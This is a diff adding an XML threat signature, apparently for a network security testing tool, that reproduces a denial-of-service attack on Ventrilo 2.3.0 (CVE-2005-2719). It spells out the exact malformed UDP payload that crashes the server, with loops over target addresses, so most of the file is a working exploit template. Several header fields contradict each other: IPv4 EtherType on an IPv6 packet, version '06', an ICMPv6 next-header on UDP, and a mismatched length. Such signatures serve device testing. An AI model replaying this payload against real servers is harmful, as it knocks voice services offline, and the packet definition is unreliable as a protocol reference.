@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Ventrilo VoIP Denial of Service (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a malformed UDP packet that causes the Voice Over IP application Ventrilo to crash.  This threat sends the malformed UDP packet to port 3784. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Thrashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="VoIP_Equipment"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Flagship_Industries"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Flagship_Industries_Ventrilo"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Flagship_Industries_Ventrilo_2.3.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://aluigi.altervista.org/adv/ventboom-adv.txt"/>
+    <CVEID display="true" value="CVE-2005-2719"/>
+    <bugtraqID display="true" value="14644"/>
+    <OSVDB display="true" value="18946"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0f2d47928a4e958a3c527adf9d8ecfd9"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236797613"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X74\XE2\X12\XF5\XDE\X2B\X12\X19\X45\XC0\XDB\XDF\X65\XFF\X56\X4F\X73\X08\X4B\XCB"/>
+    <Created value="1139462526" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+      <for index="G"/>
+      <for index="H"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="" Payload="74E212F5DE2B121945C0DBDF65FF564F73084BCB"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
